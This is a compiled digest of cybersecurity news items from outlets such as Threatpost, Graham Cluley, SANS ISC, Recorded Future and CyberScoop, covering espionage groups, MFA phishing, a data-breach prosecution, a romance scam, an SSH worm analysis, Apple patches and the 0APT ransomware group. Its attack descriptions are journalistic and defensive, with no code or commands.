“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[15] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
────────────────────────────────────────────────────────────────────────────────
Tarih: Sat, 07 Feb 2026 13:19:52 +0000

[TAM METİN - 653 kelime]
An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.

That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.

The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.

The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.

Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.

Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.

Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.

In total, she sent over US $2.5 million before realising that she had fallen victim to a con.

But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.

Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.

Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.

Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.

Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.

But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.

Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.

A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.

Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.

The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.

Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.

Four Seconds to Botnet - Analyzing a Self Propagating SSH Worm with Cryptographically Signed C2 [Guest Diary]

[This is a Guest Diary by Johnathan Husch, an ISC intern as part of the SANS.edu BACS program]

Weak SSH passwords remain one of the most consistently exploited attack surfaces on the Internet. Even today, botnet operators continue to deploy credential stuffing malware that is capable of performing a full compromise of Linux systems in seconds.

During this internship, my DShield sensor captured a complete attack sequence involving a self-spreading SSH worm that combines:

- Credential brute forcing
- Multi-stage malware execution

Figure 1: Network diagram of observed attack

Authentication Activity

The attack originated from 83.135.10.12, which traces back to Versatel Deutschland, an ISP in Germany [1]. 
The threat actor connected using the following SSH client:
SSH-2.0-OpenSSH_8.4p1 Raspbian-5+b1
HASSH: ae8bd7dd09970555aa4c6ed22adbbf56
The 'raspbian' strongly suggests that the attack is coming from an already compromised Raspberry Pi.

Post Compromise Behavior

Once the threat actor was authenticated, they immediately uploaded a small malicious bash script and executed it. 
Below is the attackers post exploitation sequence:

The uploaded and executed script was a 4.7KB bash script captured by the DShield sensor. The script performs a full botnet lifecycle. The first action the script takes is establishing persistence by performing the following:

The threat actor then kills the processes for any competitors malware and alters the hosts file to add a known C2 server [2] as the loopback address

Interestingly, an embedded RSA key was active and was used to verify commands from the C2 operator. The script then joins 6 IRC networks and connects to one IRC channel: #biret

Once connected, the C2 server finishes enrollment by opening a TCP connection, registering the nickname of the device and completes registration. From here, the C2 performs life checks of the device by quite literally playing ping pong with itself. If the C2 server sends down "PING", then the compromised device must send back "PONG".

Lateral Movement and Worm Propagation

Once the C2 server confirms connectivity to the compromised device, we see the tools zmap and sshpass get installed. The device then conducts a zmap scan on 100,000 random IP addresses looking for a device with port 22 (SSH) open. For each vulnerable device, the worm attempts two sets of credentials:

- pi / raspberry
- pi / raspberryraspberry993311

Upon successful authentication, the whole process begins again. 
While a cryptominer was not installed during this attack chain, the C2 server would most likely send down a command to install one based on the script killing processes for competing botnets and miners.

Why Does This Attack Matter

This attack in particular teaches defenders a few lessons:

Weak passwords can result in compromised systems. The attack was successful as a result of enabled default credentials; a lack of key based authentication and brute force protection being configured. 
IoT Devices are ideal botnet targets. These devices are frequently left exposed to the internet with the default credentials still active.
Worms like this can spread both quickly and quietly. This entire attack chain took under 4 seconds and began scanning for other vulnerable devices immediately after.

How To Combat These Attacks

To prevent similar compromises, organizations could:

- Disable password authentication and use SSH keys only
- Remove the default pi user on raspberry pi devices
- Enable and configure fail2ban
- Implement network segmentation on IoT devices

This incident demonstrates how a raspberry pi device with no security configurations can be converted into a fully weaponized botnet zombie. It serves as a reminder that security hardening is essential, even for small Linux devices and hobbyist systems.

Apple Patches Everything: February 2026

Today, Apple released updates for all of its operating systems (iOS, iPadOS, macOS, tvOS, watchOS, and visionOS). The update fixes 71 distinct vulnerabilities, many of which affect multiple operating systems. Older versions of iOS, iPadOS, and macOS are also updated.

OF special note is CVE-2026-20700. This vulnerability has already been exploited in targeted attacks. It allows attackers who can write to memory to execute code. Two vulnerabilities patched in December are related to the same attack (CVE-2025-14174 and CVE-2025-43529).

Interesting are additional Siri/Voice Over vulnerabilities that allow access to some information on locked devices. This is a recurring issue, and you should probably turn off VoiceOver and Siri on locked devices. Another recurring and likely impossible to completely eliminate threat is applications being able to access data from other applications. To reduce the probability of exploitation, limit the Apps you install on your devices.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[20] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

[21] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[22] Cyberscoop - 0APT ransomware group rises swiftly with bluster, along with genuine threat of attack
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:29:26 +0000
Link: https://cyberscoop.com/0apt-ransomware-group-hoax-technical-capabilities/

[TAM METİN - 945 kelime]
Ransomware groups crop up like weeds, angling for striking positions in a crowded field rife with turnover, infighting and unbridled competition. Yet, they rarely emerge, as 0APT did late last month, claiming roughly 200 victims out of the gate.

Researchers have thus far seen no evidence confirming 0APT attacked any of its alleged victims, which includes high-profile organizations. Alleged victim data samples and the structure and size of placeholder file trees published by 0APT place further doubt on the group’s supposed criminal escapades.

Most signs suggest the group is running a massive hoax, but at least some of the threat 0APT poses is grounded in truth. The group’s inflated pretense may be a ruse to create a sense of momentum, gain recognition and attract affiliates.

“While 0APT is probably bluffing about the victims it has already compromised, it is not bluffing on the technical capabilities of its actual ransomware,” Cynthia Kaiser, senior vice president at Halcyon’s ransomware research center, told CyberScoop.

0APT’s infrastructure is sound, including cryptographically strong and fully operational ransomware binaries, unique code and a well organized panel for affiliates, she said. “Even if researchers assess most claimed victims as fabricated, the underlying ransomware payload represents genuine risk to any organization that encounters it.”

The group’s outlandish claims accentuates the messy state of ransomware, with researcher interest and widespread fear among potential victims — perceived or real — delivering benefits for criminal syndicates that compete for mindshare and co-conspirators.

0APT’s apparent swift rise with a massive alleged victim count that hovered around 200 organizations within its first week online caught the attention of multiple ransomware research firms, resulting in reports this week by Halcyon and GuidePoint Security.

Researchers roundly consider the group’s initial claims an act of deception. This pattern of claiming a high number of victims without substantiating evidence surfaced last year with other ransomware groups, including Babuk2 and FunkSec, which eventually disclosed confirmed victims.

“After those initial fake lists, we started to see legitimate victims as the gangs attracted affiliates and matured into fully functioning ransomware-as-a-service organizations,” Kaiser said.

GuidePoint researchers acknowledge 0APT could evolve into a genuine problem, but they are more dismissive of the group’s capabilities.

Justin Timothy, principal threat intelligence consultant at GuidePoint, said 0APT’s encryptor isn’t unique or noteworthy amongst its ransomware peers.

“The ransomware encryptor is only one piece of the attack kill chain,” he said. “Threat actors still need to be able to obtain initial access, escalate privilege, and move laterally all while evading detection and endpoint detection and response. These aspects can often take more skill and technical knowledge compared to the creation of encryption malware.”

While 0APT might be running a scam, it doesn’t appear to be a fly-by-night operation.

The group’s alleged victims are opportunistic and predominantly operate in critical infrastructure and data-rich sectors, according to Halcyon. Most of the claimed victims are based in the United States, and the top sectors targeted include health care, professional services, technology, transportation and logistics, energy and manufacturing.

0APT has been consistently adding and removing alleged victims from its data-leak site, which went offline briefly before returning earlier this week with a much lower victim count.

“The group’s early claims appear to focus more on gaining visibility and momentum, believing those will recruit affiliates faster than validity,” Kaiser said.

Attracting affiliates and attention for future operations could be driving some of 0APT’s behavior, but cybercriminals frequently deride such activities once the extent of their lies becomes widely known, said Jason Baker, managing security consultant of threat intelligence at GuidePoint.

“That strategy was almost certainly shortsighted and undermined by 0APTs fabrications, which render them an unattractive partner or destination for affiliates going forward,” Baker said. “After all, if they’re willing to lie this brazenly about their victims and capabilities, why wouldn’t they lie to their affiliates as well?”

The make-up of 0APT remains unknown, with no obvious lineage or overlap with other ransomware variants, but the group is financially motivated and very aggressive in communications, Kaiser said.

“While the operators appear to not be novices, we have no evidence of who is running the group or its exact origins,” she added.

Halcyon, which is developing technical analysis on the group, insists 0APT poses a genuine threat that will eventually ensnare legitimate victims.

“Given the fact that they are attracting attention and operating a capable encryptor, we see the potential as high that real victims may soon appear,” Kaiser said. A focused rebrand, such as removing all the fake victims and starting to list real victims, even only a few, will be a strong signal that the group has evolved into a serious operation.”

